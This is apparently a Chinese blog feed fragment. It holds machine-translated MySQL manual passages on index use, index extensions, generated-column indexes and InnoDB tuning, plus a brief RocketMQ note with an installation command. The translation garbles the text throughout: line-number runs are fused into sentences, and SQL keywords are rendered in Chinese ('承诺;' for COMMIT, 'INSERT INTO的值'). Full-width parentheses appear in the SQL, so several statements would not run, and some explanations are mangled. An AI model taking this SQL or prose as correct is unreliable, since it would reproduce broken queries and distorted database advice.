不使用索引： / * index_part1未使用* /... WHERE index_part2= 1 AND index_part3= 2 / *索引不用于WHERE子句的两个部分* /... WHERE index= 1或A = 10 / *没有索引跨越所有行* /... WHERE index_part1= 1 OR index_part2= 10有时MySQL不使用索引，即使有索引。出现这种情况的一种情况是，优化程序估计使用索引需要MySQL访问表中非常大部分的行。（在这种情况下，表扫描可能会快得多，因为它需要更少的搜索。）但是，如果这样的查询LIMIT仅用于检索某些行，则MySQL无论如何都会使用索引，因为它可以更快地找到结果中返回的行数很少。哈希指数特征哈希索引与刚刚讨论的哈希索引有些不同：它们只用于使用等于比较 =或&lt;=&gt; 运营商（但非常快）。它们不用于比较运算符，比如 &lt;找到一系列值。依赖这种单值查找的系统被称为“ 键值存储 ” ; 为这些应用程序使用MySQL，尽可能使用散列索引。优化器不能使用散列索引来加速 ORDER BY操作。（这种类型的索引不能用于按顺序搜索下一个条目。）MySQL不能确定两个值之间大约有多少行（范围优化器使用它来决定使用哪个索引）。如果您将某个表MyISAM或 InnoDB表更改为散列索引 MEMORY表，这可能会影响某些查询。只有整个键才能用来搜索一行。（使用B树索引，可以使用密钥的任何最左边的前缀来查找行。） 8.3.9使用索引扩展123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132InnoDB通过附加主键列来自动扩展每个二级索引。考虑这个表格定义：CREATE TABLE t1（ i1 INT NOT NULL DEFAULT 0， i2 INT NOT NULL DEFAULT 0， d DATE DEFAULT NULL， PRIMARY KEY（i1，i2）， INDEX k_d（d））ENGINE = InnoDB;该表定义列上的主键(i1, i2)。它还k_d在列上定义了二级索引 (d)，但在内部InnoDB扩展此索引并将其视为列(d, i1, i2)。优化程序在确定如何以及是否使用该索引时会考虑扩展二级索引的主键列。这可以导致更高效的查询执行计划和更好的性能。优化器可以使用扩展次要索引 ref，range和 index_merge索引访问，为松散索引扫描，对于加入和排序的优化，以及用于 MIN()/ MAX() 优化。以下示例显示了执行计划如何受到优化程序是否使用扩展辅助索引的影响。假设t1这些行被填充：INSERT INTO t1 VALUES（1,1，&apos;1998-01-01&apos;），（1,2，&apos;1999-01-01&apos;），（1，3，&apos;2000-01-01&apos;），（1，4，&apos;2001-01-01&apos;），（1，5，&apos;2002-01-01&apos;），（2,1，&apos;1998-01-01&apos;），（2，2，&apos;1999-01-01&apos;），（2,3，&apos;2000-01-01&apos;），（2,4，&apos;2001-01-01&apos;），（2，5，&apos;2002-01-01&apos;），（3,1，&apos;1998-01-01&apos;），（3,2，&apos;1999-01-01&apos;），（3,3，&apos;2000-01-01&apos;），（3,4，&apos;2001-01-01&apos;），（3，5，&apos;2002-01-01&apos;），（4,1，&apos;1998-01-01&apos;），（4，2，&apos;1999-01-01&apos;），（4，3，&apos;2000-01-01&apos;），（4，4，&apos;2001-01-01&apos;），（4，5，&apos;2002-01-01&apos;），（5,1，&apos;1998-01-01&apos;），（5,2，&apos;1999-01-01&apos;），（5，3，&apos;2000-01-01&apos;），（5，4，&apos;2001-01-01&apos;），（5，5，&apos;2002-01-01&apos;）;现在考虑这个查询：EXPLAIN SELECT COUNT（*）FROM t1 WHERE i1 = 3 AND d =&apos;2000-01-01&apos;在这种情况下，优化器不能使用主键，因为它包含列(i1, i2)并且查询没有引用i2。取而代之的是，优化器可以使用二级索引k_d上 (d)，并且执行计划依赖于扩展索引是否被使用。当优化器不考虑索引扩展时，它将索引k_d视为唯一(d)。 EXPLAIN为查询产生这个结果：MySQL的&gt; EXPLAIN SELECT COUNT(*) FROM t1 WHERE i1 = 3 AND d = &apos;2000-01-01&apos;\G*************************** 1. row ******************** ******* ID：1 select_type：SIMPLE 表：t1 键入：refpossible_keys：PRIMARY，k_d 键：k_d key_len：4 ref：const 行数：5 额外：使用where; 使用索引当优化需要索引扩展到帐户，它把k_d作为(d, i1, i2)。在这种情况下，它可以使用最左边的索引前缀(d, i1)来产生更好的执行计划：MySQL的&gt; EXPLAIN SELECT COUNT(*) FROM t1 WHERE i1 = 3 AND d = &apos;2000-01-01&apos;\G*************************** 1. row ******************** ******* ID：1 select_type：SIMPLE 表：t1 键入：refpossible_keys：PRIMARY，k_d 键：k_d key_len：8 ref：const，const 行：1 额外：使用索引在这两种情况下，都key表示优化器将使用二级索引，k_d但EXPLAIN输出显示了使用扩展索引的这些改进：key_len从4个字节到8个字节去，表明键查找中使用的列d 和i1，而不仅仅是d。该ref从价值变动 const到const,const ，因为键查找使用两个关键部分，没有之一。的rows计数降低从5到1，表明InnoDB应该需要检查更少的行，以产生结果。该Extra值从变化 Using where; Using index到 Using index。这意味着可以仅使用索引读取行，而无需查阅数据行中的列。使用扩展索引的优化器行为差异也可以通过以下方式看出SHOW STATUS：FLUSH TABLE t1;FLUSH STATUS;SELECT COUNT（*）FROM t1 WHERE i1 = 3 AND d =&apos;2000-01-01&apos;;SHOW STATUS LIKE&apos;handler_read％&apos;前面的语句包含FLUSH TABLES并FLUSH STATUS 刷新表缓存并清除状态计数器。没有索引扩展，SHOW STATUS产生这样的结果：+ ----------------------- + ------- +| 变量名| 值|+ ----------------------- + ------- +| Handler_read_first | 0 || Handler_read_key | 1 || Handler_read_last | 0 || Handler_read_next | 5 || Handler_read_prev | 0 || Handler_read_rnd | 0 || Handler_read_rnd_next | 0 |+ ----------------------- + ------- +通过索引扩展，SHOW STATUS生成此结果。该 Handler_read_next值从5减少到1，表示更有效地使用该指数：+ ----------------------- + ------- +| 变量名| 值|+ ----------------------- + ------- +| Handler_read_first | 0 || Handler_read_key | 1 || Handler_read_last | 0 || Handler_read_next | 1 || Handler_read_prev | 0 || Handler_read_rnd | 0 || Handler_read_rnd_next | 0 |+ ----------------------- + ------- +在确定如何使用表的二级索引时use_index_extensions，optimizer_switch系统变量 的标志 允许控制优化程序是否考虑主键列 InnoDB。默认情况下， use_index_extensions已启用。要检查禁用索引扩展是否会提高性能，请使用以下语句：SET optimizer_switch =&apos;use_index_extensions = off&apos;;优化器使用索引扩展受索引（16）中关键部分数量和最大关键字长度（3072字节）的通常限制。 8.3.10优化器使用生成的列索引123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475MySQL支持生成列上的索引。例如：CREATE TABLE t1（f1 INT，gc INT AS（f1 + 1）STORED，INDEX（gc））;生成的列gc被定义为表达式f1 + 1。该列也被编入索引，并且优化程序可以在执行计划构建期间考虑该索引。在以下查询中，该 WHERE子句引用gc 并且优化器考虑该列上的索引是否产生更高效的计划：SELECT * FROM t1 WHERE gc&gt; 9;优化器可以在生成的列上使用索引来生成执行计划，即使在没有按名称对这些列进行查询时直接引用也是如此。会发生此如果 WHERE，ORDER BY或 GROUP BY条款是指一些索引生成列的定义相匹配的表达式。以下查询不直接引用，gc 但使用的表达式符合以下定义 gc：SELECT * FROM t1 WHERE f1 + 1&gt; 9;优化器识别出表达f1 + 1的定义相匹配gc，并且gc被索引，因此它认为执行计划在施工期间的索引。你可以看到这个使用 EXPLAIN：MySQL的&gt; EXPLAIN SELECT * FROM t1 WHERE f1 + 1 &gt; 9\G*************************** 1. row ******************** ******* ID：1 select_type：SIMPLE 表：t1 分区：NULL 键入：范围possible_keys：gc key：gc key_len：5 ref：NULL 行：1 过滤：100.00 额外：使用索引条件实际上，优化程序已将表达式替换为与表达式f1 + 1匹配的生成列的名称。在以下EXPLAIN 显示的扩展信息中可用的重写查询中也很明显SHOW WARNINGS：MySQL的&gt; SHOW WARNINGS\G*************************** 1. row ******************** ******* 级别：注意 代码：1003Message：/ * select＃1 * / select`test`.`t1`.`f1` as``f1`，`test`.`t1`.`gc` as```````````````gc`以下限制和条件适用于优化器使用生成的列索引：对于查询表达式来匹配生成的列定义，表达式必须是相同的，并且它必须具有相同的结果类型。例如，如果生成的列表达式是f1 + 1，如果查询使用1 + f1，或者f1 + 1 （整数表达式）与字符串进行比较，则优化器不会识别匹配 。优化适用于这些操作符： =， &lt;， &lt;=， &gt;， &gt;=， BETWEEN，和 IN()。对于BETWEEN和 以外的 IN()操作符，可以用匹配的生成列替换操作数。对于 BETWEEN和 IN()，只有第一个参数可以被匹配的生成列替换，其他参数必须具有相同的结果类型。 BETWEEN并且 IN()尚未支持涉及JSON值的比较。生成的列必须被定义为一个表达式，该表达式至少包含一个函数调用或上述项目中提到的某个操作符。表达式不能包含对另一列的简单引用。例如，gc INT AS (f1) STORED仅由一个列引用组成，因此gc不考虑索引 。为了将字符串与索引生成列进行比较，这些字段从返回带引号字符串的JSON函数计算值，JSON_UNQUOTE()需要在列定义中从函数值中删除多余的引号。（对于字符串与函数结果的直接比较，JSON比较器处理引用移除，但这不会发生在索引查找中）。例如，不是像这样写一个列定义：doc_name TEXT AS（JSON_EXTRACT（jdoc，&apos;$ .name&apos;））存储这样写：doc_name TEXT AS（JSON_UNQUOTE（JSON_EXTRACT（jdoc，&apos;$ .name&apos;）））STORED对于后者的定义，优化器可以检测这两个比较的匹配情况：... WHERE JSON_EXTRACT（jdoc，&apos;$ .name&apos;）=&apos; some_string&apos;...... WHERE JSON_UNQUOTE（JSON_EXTRACT（jdoc，&apos;$ .name&apos;））=&apos; some_string&apos;...如果没有JSON_UNQUOTE()在列定义中，优化器只会对这些比较中的第一个进行匹配。如果优化器未能选择所需的索引，则可以使用索引提示来强制优化器做出不同的选择。]]></content>
      <categories>
        <category>java</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RocketMQ]]></title>
    <url>%2F2018%2F03%2F24%2Fmessage-queue%2Frocketmq%2F</url>
    <content type="text"><![CDATA[解决问题 分布式各系统之间的消息通讯【一般用来解决事务性提交】 应用场景 各模块之间 消息调用、 高并发的数据落地 事务解决方案 使用方式 我的开源服务中集成代码 message-queue 模块 {———-} 安装123curl -L -O https://github.com/alibaba/rocketmq/archive/v3.5.8.zipunzip v3.5.8.zip -d rocketmq 原理 xmind文档 生产环境遇到的问题 消息阻塞【扩consumer、查看log 是什么原因导致消息阻塞】 消息长时间不到达【优先级策略】 消息确认机制会影响消息消费速度、虽然保证了每条消费一次]]></content>
      <categories>
        <category>java</category>
        <category>message-queue</category>
      </categories>
      <tags>
        <tag>消息中间件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL优化【InnoDB-表优化】]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-innodb%2F</url>
    <content type="text"><![CDATA[innodb表优化 8.5.1优化InnoDB表的存储布局12345678910111213141516171819202122232425262728293031一旦数据达到稳定的大小，或者增长表增加了几十或几百兆字节，请考虑使用该OPTIMIZE TABLE语句来重新组织表并压缩任何浪费的空间。重新组织的表需要更少的磁盘I / O来执行全表扫描。当其他技术（如改进索引使用或调整应用程序代码）不切实际时，这是一种直接技术，可以提高性能。OPTIMIZE TABLE复制表格的数据部分并重建索引。好处来自改进索引内数据的打包，并减少表空间和磁盘内的碎片。好处取决于每个表中的数据。您可能会发现某些人有显着的收益，而不是其他人，或者收益会随着时间的推移而下降，直到您再次优化表。如果表很大或者重建的索引不适合缓冲池，则此操作可能会很慢。向表中添加大量数据后的第一次运行通常比后期运行慢得多。在中InnoDB，有一个很长的PRIMARY KEY（无论是一个长的值的单个列，还是多个形成一个长复合值的列）浪费了大量的磁盘空间。一行中的主键值在所有指向同一行的二级索引记录中都是重复的。（请参见第14.8.2.1节“集群索引和二级索引”。）AUTO_INCREMENT如果主键很长，或者索引长VARCHAR列的前缀而不是整列，则创建一个列作为主键。使用VARCHAR数据类型而不是CHAR存储可变长度的字符串或具有多个NULL值的列 。甲 列总是占据字符来存储数据，即使该字符串是较短，或者其值 。较小的表适合缓冲池，并减少磁盘I / O。 CHAR(N)NNULL使用COMPACT行格式（默认InnoDB格式）和可变长度字符集（如 utf8或）时sjis， 列占用可变数量的空间，但仍至少为字节。 CHAR(N)N对于大的表或者包含大量重复的文本或数字数据的表，请考虑使用 COMPRESSED行格式。将数据带入缓冲池或执行全表扫描需要较少的磁盘I / O。在做出永久性决定之前，请测量使用行格式COMPRESSED与 您可以实现的压缩量 COMPACT。 {———-} 8.5.2优化InnoDB事务管理12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061要优化InnoDB事务处理，请在事务功能的性能开销和服务器的工作负载之间找到理想的平衡点。例如，如果应用程序每秒提交数千次，则应用程序可能会遇到性能问题，如果应用程序每2-3小时提交一次，则会出现不同的性能问题。默认的MySQL设置AUTOCOMMIT=1 可能会对繁忙的数据库服务器造成性能限制。在可行的情况下，在进行所有更改后，通过发布SET AUTOCOMMIT=0或START TRANSACTION声明将几个相关的数据更改操作包括到单个事务中 ，然后包含 COMMIT声明。InnoDB如果该事务对数据库进行了修改，则必须在每次事务提交时将日志刷新到磁盘。当每次更改之后都进行提交（与默认的自动提交设置一样）时，存储设备的I / O吞吐量会对每秒潜在操作的数量设置上限。或者，对于仅由单个SELECT语句组成的事务，开启AUTOCOMMIT有助于 InnoDB识别只读事务并优化它们。有关要求，请参见 第8.5.3节“优化InnoDB只读事务”。避免在插入，更新或删除大量行后执行回滚。如果一个大事务正在降低服务器的性能，那么回滚会导致问题变得更糟，可能需要几次才能执行原始数据更改操作。杀死数据库进程无济于事，因为在服务器启动时会再次开始回滚。为了尽量减少发生此问题的机会：增加缓冲池的大小， 以便可以缓存所有数据更改更改，而不是立即写入磁盘。设置 innodb_change_buffering=all 以便更新和删除操作在插入之外进行缓冲。考虑COMMIT在大数据更改操作期间定期发布语句，可能会将单个删除或更新分为多个在较少数量的行上操作的语句。为避免出现失控回滚，请增加缓冲池，以便回滚变为受CPU限制且运行速度很快，或者innodb_force_recovery=3按照第14.18.2节“InnoDB恢复”中的说明关闭服务器并重新启动 。预计这个问题很少出现在默认设置下 innodb_change_buffering=all，这样可以将更新和删除操作缓存到内存中，从而使它们在第一时间执行得更快，并且如果需要还可以更快地回滚。确保在处理长时间运行事务的服务器上使用此参数设置，并进行多次插入，更新或删除操作。如果发生崩溃时可以承受某些最新已提交事务的丢失，则可以将该innodb_flush_log_at_trx_commit 参数设置 为0. InnoDB尽管无法保证刷新，但试图每秒刷新一次日志。另外，将值设置 innodb_support_xa为0，这将减少由于在磁盘数据和二进制日志上同步而导致的磁盘刷新次数。注意innodb_support_xa已弃用，将在未来版本中删除。从MySQL 5.7.10开始，InnoDB对XA事务中的两阶段提交的支持始终处于启用状态，并且innodb_support_xa不再允许禁用 。当行被修改或删除时，行和关联的 撤消日志不会立即被物理删除，甚至在事务提交后立即被删除。保留旧数据，直到完成较早或同时开始的事务，以便这些事务可以访问修改行或已删除行的先前状态。因此，长时间运行的事务可以防止InnoDB清除不同事务更改的数据。当在长时间运行的事务中修改或删除行时，使用READ COMMITTED和 REPEATABLE READ隔离级别的其他事务在 读取相同行时必须执行更多工作才能重新构建旧数据。当长时间运行的事务修改表时，其他事务对该表的查询不使用覆盖索引技术。通常可以从辅助索引中检索所有结果列的查询，而是从表格数据中查找适当的值。如果发现二级索引页面 PAGE_MAX_TRX_ID太新，或者二级索引中的记录被删除标记，则 InnoDB可能需要使用聚簇索引查找记录。 8.5.3优化InnoDB只读事务1234567891011121314151617181920212223242526272829303132InnoDB可以避免与为已知为只读的事务设置事务ID（TRX_ID字段）相关联的开销。只有可能执行写入操作或锁定读取的事务才需要事务ID ， 例如 。消除不必要的事务ID会减少每次查询或数据更改语句构造读取视图时查阅的内部数据结构的大小。 SELECT ... FOR UPDATEInnoDB 在以下情况下检测只读事务：交易以START TRANSACTION READ ONLY声明开始 。在这种情况下，尝试更改数据库（for InnoDB， MyISAM或其他类型的表）会导致错误，并且事务以只读状态继续：错误1792（25006）：无法在READ ONLY事务中执行语句。您仍然可以在只读事务中更改特定于会话的临时表，或者为它们发出锁定查询，因为这些更改和锁对任何其他事务都不可见。该autocommit设置处于打开状态，以便事务保证为单个语句，构成事务的单个语句为“ 非锁定 ” SELECT语句。也就是说 SELECT，它不使用一个FOR UPDATE或一个LOCK IN SHARED MODE 子句。事务在没有READ ONLY选项的情况下启动，但没有显式锁定行的更新或语句已经执行。在需要更新或显式锁定之前，事务处于只读模式。因此，对于读取密集型应用，如报表生成器，您可以调整的序列，InnoDB 由内而外将它们分组查询 START TRANSACTION READ ONLY和 COMMIT， 或通过打开autocommit 运行之前设置SELECT语句，或简单地避免与查询穿插任何数据更改语句。有关信息 START TRANSACTION，并 autocommit请参见 13.3.1节，“START TRANSACTION，COMMIT和ROLLBACK语法”。注意具有自动提交，非锁定和只读（AC-NL-RO）资格的事务处于特定内部 InnoDB数据结构之外，因此未在SHOW ENGINE INNODB STATUS输出中列出 。 8.5.4优化InnoDB重做日志12345678910111213141516171819202122232425262728293031323334353637383940414243考虑以下关于优化重做日志的指导原则：使您的重做日志文件变大，甚至与缓冲池一样大 。当 InnoDB写完重做日志文件时，它必须将检查点中缓冲池的修改内容写入磁盘 。 小的重做日志文件导致许多不必要的磁盘写入。虽然历史上重要的重做日志文件会导致冗长的恢复时间，但现在恢复速度更快， 您可以放心地使用大型重做日志文件。重做日志文件的大小和数量使用innodb_log_file_size 和 innodb_log_files_in_group 配置选项进行配置。 有关修改现有重做日志文件配置的信息，请参见 第14.7.2节“更改InnoDB重做日志文件的数量或大小”。考虑增加日志缓冲区的大小 。大型日志缓冲区允许大型 事务运行，而无需在事务提交之前将日志写入磁盘。 因此，如果您有更新，插入或删除多行的事务，则使日志缓冲区更大可节省磁盘I / O。 日志缓冲区大小使用innodb_log_buffer_size 配置选项进行 配置。配置 innodb_log_write_ahead_size 配置选项以避免“ 读写 ”。该选项定义重做日志的预写块大小。 设置 innodb_log_write_ahead_size 为匹配操作系统或文件系统缓存块大小。 由于重做日志的预写块大小与操作系统或文件系统高速缓存块大小之间的不匹配， 重做日志块未完全缓存到操作系统或文件系统时发生了写入时读写。有效值 innodb_log_write_ahead_size 是InnoDB日志文件块大小（2 n）的倍数。最小值是InnoDB日志文件块大小（512）。 指定最小值时不发生预写。最大值等于该 innodb_page_size值。 如果您指定的值 innodb_log_write_ahead_size 大于该 innodb_page_size值，则该 innodb_log_write_ahead_size 设置将被截断为该 innodb_page_size值。innodb_log_write_ahead_size 相对于操作系统或文件系统缓存块大小 设置 值太低会导致写入时读写。fsync由于一次写入多个块，因此将值设置得过高可能会对日志文件写入的性能产生轻微影响 。 8.5.5 InnoDB表的批量数据加载123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869这些性能提示补充了第8.2.4.1节“优化INSERT语句”中有关快速插入的一般准则。将数据导入时InnoDB，请关闭自动提交模式，因为它会为每个插入操作执行日志刷新到磁盘。为了您的导入操作过程中禁用自动提交，与环绕它 SET autocommit和 COMMIT语句：SET autocommit = 0;... SQL import statements ...承诺;该mysqldump的选项 --opt创建这样的快速导入到转储文件InnoDB 表，即使没有与他们包装 SET autocommit和 COMMIT报表。如果您UNIQUE对辅助键有限制，可以通过在导入会话期间暂时关闭唯一性检查来加快表导入的速度：SET unique_checks = 0;... SQL import statements ...SET unique_checks = 1;对于大表而言，这可以节省大量的磁盘I / O，因为 InnoDB可以使用其更改缓冲区来批量写入二级索引记录。确保数据不包含重复的密钥。如果您FOREIGN KEY的表中存在约束，则可以通过在导入会话期间关闭外键检查来加速表导入：SET foreign_key_checks = 0;... SQL import statements ...SET foreign_key_checks = 1;对于大表，这可以节省大量的磁盘I / O。INSERT 如果您需要插入多行， 请使用多行语法来减少客户端和服务器之间的通信开销：INSERT INTO的值（1,2），（5,5），...;此提示适用于插入任何表格，而不仅限于 InnoDB表格。当对具有自动增量列的表进行批量插入时，请将其设置 innodb_autoinc_lock_mode为2而不是默认值1.有关详细信息， 请参见 第14.8.1.5节“InnoDB中的AUTO_INCREMENT处理”。执行批量插入时，按PRIMARY KEY顺序插入行速度更快 。 InnoDB表使用 聚集索引，这使得使用数据的顺序相对较快PRIMARY KEY。 按PRIMARY KEY顺序执行批量插入对于完全不适合缓冲池的表格尤为重要。为了将数据加载到InnoDB FULLTEXT索引时获得最佳性能 ，请按照以下步骤操作：FTS_DOC_ID在创建表的时候 定义一个类型为BIGINT UNSIGNED NOT NULL，具有唯一索引的列 FTS_DOC_ID_INDEX。例如：CREATE TABLE t1（FTS_DOC_ID BIGINT unsigned NOT NULL AUTO_INCREMENT，title varchar（255）NOT NULL DEFAULT&apos;&apos;，文本中文NOT NULL，PRIMARY KEY（`FTS_DOC_ID`））ENGINE = InnoDB DEFAULT CHARSET = latin1;在t1（FTS_DOC_ID）上创建唯一索引FTS_DOC_ID_INDEX;将数据加载到表中。FULLTEXT数据加载完成后 创建索引。注意FTS_DOC_ID在创建表格 时添加列时，确保在 FTS_DOC_ID更新 FULLTEXT索引列时更新列，因为FTS_DOC_ID每个INSERTor 必须单调递增 UPDATE。 如果您选择不添加FTS_DOC_IDat表创建时间并InnoDB为您管理DOC ID，InnoDB则会FTS_DOC_ID在下一次CREATE FULLTEXT INDEX调用时将其添加 为隐藏列。 但是，这种方法需要重建表格，这会影响性能。 8.5.6优化InnoDB查询123456789101112131415161718192021222324252627要调整InnoDB表的查询，请在每个表上创建一组适当的索引。有关详细信息，请参见 第8.3.1节“MySQL如何使用索引”。遵循这些InnoDB索引的指标：由于每个InnoDB表都有一个 主键（无论您是否要求），请为每个表指定一组主键列，这些列用于最重要且时间关键的查询中。不要在主键中指定太多或太长的列，因为这些列值在每个二级索引中都是重复的。当索引包含不必要的数据时，读取此数据和内存以进行缓存的I / O会降低服务器的性能和可伸缩性。不要 为每列创建单独的 二级索引，因为每个查询只能使用一个索引。仅有少数不同值的很少测试的列或列索引可能对任何查询都没有帮助。 如果您对同一个表有很多查询，那么测试不同的列组合，尝试创建少量 连接索引而不是大量单列索引。 如果索引包含结果集所需的所有列（称为 覆盖索引），则查询可能完全避免读取表数据。如果索引列不能包含任何 NULL值，请NOT NULL在创建表时声明它。当知道每列是否包含NULL值时， 优化器可以更好地确定哪个索引最有效地用于查询 。您可以InnoDB使用第8.5.3节“优化InnoDB只读事务”中的技术优化表的 单一查询事务 。 8.5.7优化InnoDB DDL操作12345678910111213141516对于表和索引（CREATE，ALTER和 DROP语句）的DDL操作， 表中最重要的方面InnoDB是在MySQL 5.5和更高版本中创建和删除二级索引比在早期版本中快得多。 有关详细信息，请参见 第14.13.1节“在线DDL概述”。“ 快速索引创建 ”使得在某些情况下，在将数据加载到表中之前删除索引，然后在加载数据后重新创建索引会更快。使用TRUNCATE TABLE空表，不。外键约束，可以使一个语句的工作像一个普通的声明，在这种情况下，命令序列喜欢 和 可能是最快的。 DELETE FROM tbl_nameTRUNCATEDELETEDROP TABLECREATE TABLE因为主键是每个InnoDB表的存储布局不可分割的组成部分，并且更改主键的定义涉及重新组织整个表， 所以始终将主键设置为CREATE TABLE语句的一部分 ，并提前进行计划，以便您不需要 ALTER或DROP之后的主键。 8.5.8优化InnoDB磁盘I / O123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198如果您遵循SQL操作的数据库设计和调优技术的最佳实践，但由于繁重的磁盘I / O活动导致数据库仍然很慢，请考虑这些磁盘I / O优化。 如果Unix top工具或Windows任务管理器显示工作负载的CPU使用百分比低于70％，那么您的工作负载可能是磁盘限制的。增加缓冲池大小当表数据缓存在InnoDB 缓冲池中时，可以通过查询重复访问它，而不需要任何磁盘I / O。 用innodb_buffer_pool_size 选项指定缓冲池的大小 。 该内存区域非常重要，通常建议将 innodb_buffer_pool_size其配置为系统内存的50％至75％。 有关更多信息，请参见第8.12.4.1节“MySQL如何使用内存”。调整冲洗方法在GNU / Linux和Unix的某些版本中fsync()，InnoDB使用Unix 调用（ 默认使用）和类似方法将文件刷新到磁盘的速度惊人地慢。 如果数据库写入性能出现问题，请使用innodb_flush_method 参数集进行基准测试 O_DSYNC。在Linux上使用本机AIO的noop或截止日期I / O调度程序InnoDB使用Linux上的异步I / O子系统（本机AIO）来执行数据文件页面的预读和写入请求。 此行为innodb_use_native_aio 由默认情况下启用的配置选项控制 。 使用本机AIO时，I / O调度程序的类型对I / O性能有更大的影响。 通常，建议使用noop和截止日期I / O调度程序。进行基准测试以确定哪个I / O调度程序为您的工作负载和环境提供最佳结果。 有关更多信息，请参见 第14.6.8节“在Linux上使用异步I / O”。在x86_64体系结构的Solaris 10上使用直接I / O在InnoDBx86_64体系结构（AMD Opteron）的Solaris 10上使用存储引擎时，请使用直接I / O InnoDB相关文件以避免性能下降InnoDB。 要为用于存储InnoDB相关文件的整个UFS文件系统使用直接I / O，请 使用该forcedirectio选项安装它 ; 见 mount_ufs(1M)。 （Solaris 10 / x86_64上的默认设置不是使用此选项。） 要仅将直接I / O应用于InnoDB文件操作而不是整个文件系统，请设置 innodb_flush_method = O_DIRECT。 使用此设置， InnoDB呼叫 directio()而不是 fcntl() 用于I / O到数据文件（不用于I / O到日志文件）。在Solaris 2.6或更高版本中使用原始存储来存储数据和日志文件在任何版本的Solaris 2.6及更高版本和任何平台（sparc / x86 / x64 / amd64）上InnoDB使用具有较大innodb_buffer_pool_size值 的存储引擎时，请 InnoDB在裸设备上或单独的直接I / O UFS上使用数据文件和日志文件进行基准测试 文件系统，使用forcedirectio前面所述的安装选项。（innodb_flush_method如果需要对日志文件进行直接I / O ，则必须使用装入选项而不是设置 。）Veritas文件系统VxFS的用户应使用 convosync=direct装入选项。不要将其他MySQL数据文件（如MyISAM表的那些文件） 放在直接I / O文件系统上。不能将可执行文件或库放置在直接I / O文件系统上。使用额外的存储设备可以使用其他存储设备来设置RAID配置。有关相关信息，请参见 第8.12.2节“优化磁盘I / O”。或者，InnoDB表空间数据文件和日志文件可以放在不同的物理磁盘上。有关更多信息，请参阅以下部分：第14.6.1节“InnoDB启动配置”第14.7.5节“在数据目录之外创建文件 - 表 - 表 - 表空间”创建一个通用表空间第14.8.1.3节“移动或复制InnoDB表”考虑非旋转存储非循环存储通常为随机I / O操作提供更好的性能; 和顺序I / O操作的旋转存储。在通过旋转和非旋转存储设备分发数据和日志文件时，请考虑主要在每个文件上执行的I / O操作的类型。随机I /面向O形文件通常包括 文件的每个表 和普通表空间的数据文件， 撤销表空间 文件和 临时表空间文件。 连续的面向I / O的文件包括InnoDB 系统表空间文件（由于 二次写入缓冲和 更改缓冲）以及日志文件（如二进制日志文件和重做日志文件）。使用非循环存储时，请查看以下配置选项的设置：innodb_checksum_algorithm该crc32选件使用更快的校验和算法，推荐用于快速存储系统。innodb_flush_neighbors该选项优化了旋转存储设备的I / O。禁用它用于非旋转存储或混合旋转和非旋转存储。innodb_io_capacity对于较低端的非旋转存储设备，默认设置200通常是足够的。对于更高端的总线连接设备，请考虑更高的设置，例如1000。innodb_io_capacity_max默认值2000适用于使用非循环存储的工作负载。对于高端，总线连接的非旋转存储设备，考虑更高的设置，如2500。innodb_log_compressed_pages如果重做日志位于非循环存储中，请考虑禁用此选项以减少日志记录。请参阅 禁用压缩页面的记录。innodb_log_file_size如果重做日志位于非循环存储中，请配置此选项以最大化高速缓存和写入组合。innodb_page_size考虑使用与磁盘的内部扇区大小相匹配的页面大小。早期的SSD设备通常具有4k扇区大小。一些较新的设备具有16k扇区大小。 默认InnoDB 页面大小为16k。保持页面大小接近存储设备块大小可将重写到磁盘的未更改数据量减到最少。binlog_row_image如果二进制日志位于非循环存储中，并且所有表都有主键，请考虑设置此选项minimal以减少日志记录。确保为您的操作系统启用TRIM支持。它通常默认启用。增加I / O容量以避免积压如果由于InnoDB 检查点 操作导致吞吐量周期性下降 ，请考虑增加innodb_io_capacity 配置选项的值 。 较高的值会导致更频繁的 刷新，从而避免可能导致吞吐量下降的工作积压。如果冲洗不落后，则I / O容量降低如果系统不会因InnoDB 冲洗操作而落后 ，请考虑降低innodb_io_capacity 配置选项的值 。 通常情况下，您保持该选项的值尽可能低，但不能太低，以至于导致吞吐量的周期性下降，如前面的项目符号所述。 在可以降低选项值的典型场景中，您可能会在以下输出中看到类似的组合 SHOW ENGINE INNODB STATUS：历史名单长度低，低于几千。插入缓冲区合并接近插入的行。修改缓冲池中的页面始终远低于 innodb_max_dirty_pages_pct 缓冲池。（在服务器没有进行批量插入时进行测量;在批量插入时修改的页面百分比显着增加，这是正常的。）Log sequence number - Last checkpoint 小于7/8或理想情况下小于InnoDB 日志文件总大小的6/8 。将系统表空间文件存储在Fusion-io设备上通过在支持原子写入的Fusion-io设备上存储系统表空间文件（“ ibdata文件 ”），您可以利用与双写缓冲区相关的I / O优化。 在这种情况下，innodb_doublewrite自动禁用doublewrite buffering（），并且Fusion-io原子写入用于所有数据文件。 此功能仅在Fusion-io硬件上受支持，并且仅适用于Linux上的Fusion-io NVMFS。 要充分利用此功能，建议使用此 innodb_flush_method设置O_DIRECT。注意由于双写缓冲区设置是全局性的，所以对于驻留在非Fusion-io硬件上的数据文件，也会禁用双写缓冲。禁用压缩页面的日志记录使用InnoDB表格 压缩功能时，当对压缩数据进行更改时，重新压缩页面的图像 将写入 重做日志。 此行为innodb_log_compressed_pages由默认情况下启用的控制 ，以防止zlib 在恢复期间使用不同版本的压缩算法时可能发生的损坏。 如果您确定zlib版本不会更改，请禁用 innodb_log_compressed_pages 以减少修改压缩数据的工作负载的重做日志生成。 